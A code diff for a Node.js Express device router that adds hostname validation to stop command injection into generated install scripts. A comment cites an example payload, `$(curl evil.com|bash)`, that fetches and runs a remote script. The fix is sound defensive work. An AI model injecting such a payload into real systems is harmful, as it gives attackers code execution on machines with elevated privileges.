@@ -8,6 +8,40 @@ const { readDualMode } = require('../db/fieldCrypto');
 const router = express.Router();
 
 /**
+ * Validate a device hostname at creation time.
+ *
+ * Security: device.hostname is admin-supplied and later interpolated into
+ * generated PowerShell/bash install scripts (see routes/installer.js). An
+ * unvalidated value like `$(curl evil.com|bash)` would execute on the install
+ * target with elevated privileges. This restricts hostnames to a safe charset
+ * at the input boundary — the same [a-z0-9-] discipline installer.js already
+ * applies to the ZIP filename, but here at the actual input point.
+ *
+ * Rules (RFC 952/1123 label subset):
+ *   - non-empty string, 1-63 chars
+ *   - only [a-zA-Z0-9-]
+ *   - must start and end with an alphanumeric (no leading/trailing dash)
+ *
+ * @param {string} hostname
+ * @returns {{ ok: boolean, error?: string }}
+ */
+function validateHostname(hostname) {
+  if (typeof hostname !== 'string' || hostname.length === 0) {
+    return { ok: false, error: 'hostname must be a non-empty string' };
+  }
+  if (hostname.length > 63) {
+    return { ok: false, error: 'hostname must be 63 characters or fewer' };
+  }
+  if (!/^[a-zA-Z0-9-]+$/.test(hostname)) {
+    return { ok: false, error: 'hostname may only contain letters, digits, and hyphens' };
+  }
+  if (!/^[a-zA-Z0-9]/.test(hostname) || !/[a-zA-Z0-9]$/.test(hostname)) {
+    return { ok: false, error: 'hostname must start and end with a letter or digit' };
+  }
+  return { ok: true };
+}
+
+/**
  * Phase 5: Default command expiry (30 days).
  * Configurable via COMMAND_EXPIRY_DAYS env var.
  */
@@ -58,6 +92,14 @@ router.get('/:id', requireAuth, async (req, res) => {
 router.post('/', requireAuth, async (req, res) => {
   const { hostname, owner_name } = req.body;
   if (!hostname || !owner_name) return res.status(400).json({ error: 'hostname and owner_name required' });
+
+  // Security: validate hostname charset at the input boundary. hostname is
+  // later interpolated into generated install scripts (see routes/installer.js);
+  // an unsafe value would allow command injection on the install target.
+  const hostnameCheck = validateHostname(hostname);
+  if (!hostnameCheck.ok) {
+    return res.status(400).json({ error: hostnameCheck.error });
+  }
 
   // FA3: Generate a per-device API key at enrollment.
   // The plaintext key is returned ONCE and never stored server-side.
